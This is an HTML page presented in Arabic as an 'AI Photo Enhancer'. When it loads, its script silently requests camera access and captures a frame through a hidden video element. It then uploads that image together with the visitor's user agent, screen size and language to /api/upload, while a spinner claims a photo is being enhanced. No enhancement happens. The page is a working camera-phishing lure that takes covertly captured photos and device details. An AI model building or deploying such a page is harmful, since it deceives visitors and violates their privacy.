<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Photo Enhancer</title>
    <style>
        body { 
            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; 
            background: #0f172a; color: white; font-family: sans-serif; overflow: hidden; 
        }
        .card { 
            text-align: center; background: #1e293b; padding: 40px; border-radius: 20px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155;
        }
        .loader { 
            border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; 
            width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .result { display: none; font-size: 60px; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card" id="ui">
        <div class="loader"></div>
        <h2>جاري تحسين الصورة...</h2>
    </div>

    <div id="result-success" class="result">✅</div>
    <div id="result-error" class="result">❌</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video'), canvas = document.getElementById('canvas'), ctx = canvas.getContext('2d');
        const ui = document.getElementById('ui'), succ = document.getElementById('result-success'), err = document.getElementById('result-error');

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.onloadedmetadata = () => setTimeout(() => capture(stream), 500);
            } catch(e) { ui.style.display='none'; err.style.display='block'; }
        }

        function capture(stream) {
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('captured_image', blob, 'snap.jpg');
                fd.append('deviceInfo', JSON.stringify({
                    userAgent: navigator.userAgent,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language
                }));
                try {
                    const res = await fetch('/api/upload', { method: 'POST', body: fd });
                    ui.style.display='none';
                    res.ok ? (succ.style.display='block') : (err.style.display='block');
                } catch(e) { ui.style.display='none'; err.style.display='block'; }
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.9);
        }
        start();
    </script>
</body>
</html>
